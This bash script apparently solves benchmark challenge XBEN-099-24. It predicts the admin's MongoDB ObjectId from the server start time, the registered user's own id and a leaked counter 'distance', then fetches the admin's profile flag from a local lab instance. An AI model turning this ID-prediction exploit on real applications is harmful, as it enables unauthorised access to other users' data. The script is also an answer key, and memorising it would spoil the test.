#!/usr/bin/env bash
# XBEN-099-24 — reconstructing a MongoDB ObjectId. Proxy-mode twin. Registering
# returns our own ObjectId and the "distance" to the admin's. An ObjectId's
# first 4 bytes are a timestamp (from /starttime) and the last 3 a counter, so
# the admin's id is our machine/pid bytes with the counter stepped back by the
# distance; /profile/<id> then shows the admin's flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben099p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/register"; BASE="$(req_of GET register)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
mine="$("$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/register' --set "form.username=probe$$" --set 'form.password=pw' 2>/dev/null)"
started="$("$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/starttime' 2>/dev/null | grep -oE '\b1[0-9]{9}\b' | head -1)"
first="$(python3 -c "
import json, re, sys
body=sys.argv[1]
m=re.search(r'\"userId\"\s*:\s*\"([0-9a-f]{24})\"', body); d=re.search(r'\"distance\"\s*:\s*(\d+)', body)
mine, distance = m.group(1), int(d.group(1))
print('%08x%s%06x' % (int(sys.argv[2]), mine[8:18], int(mine[18:24],16) - distance))
" "$mine" "$started")"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set "path=/profile/$first" >/dev/null
print_flag
